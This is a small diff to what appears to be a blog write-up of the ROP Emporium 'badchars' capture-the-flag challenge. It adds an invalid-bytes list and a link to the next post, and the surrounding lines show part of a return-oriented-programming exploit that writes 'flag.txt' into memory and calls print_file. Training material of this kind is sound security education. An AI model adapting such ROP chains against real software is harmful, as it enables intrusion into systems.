@@ -265,6 +265,8 @@ pop_rdi = 0x004006a3
 print_file_addr = 0x00400510
 junk = 0xdeadbeefdeadbeef
 
+invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]
+
 # write string s to address addr
 # return ropchain in bytes
 def write_str(addr, s):
@@ -314,7 +316,6 @@ payload = b'A' * 40
 fname = encode_str(b'flag.txt')
 payload += write_str(write_addr, fname)
 payload += decode_str(write_addr, fname)
-
 # call print_file
 payload += p64(pop_rdi)
 payload += p64(write_addr)
@@ -402,4 +403,4 @@ more complicated gadgets.
 
 Next Challenge (fluff)
 
-badchars x86
+[badchars x86]({% post_url 2024-06-05-rop-emporium-badchars-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
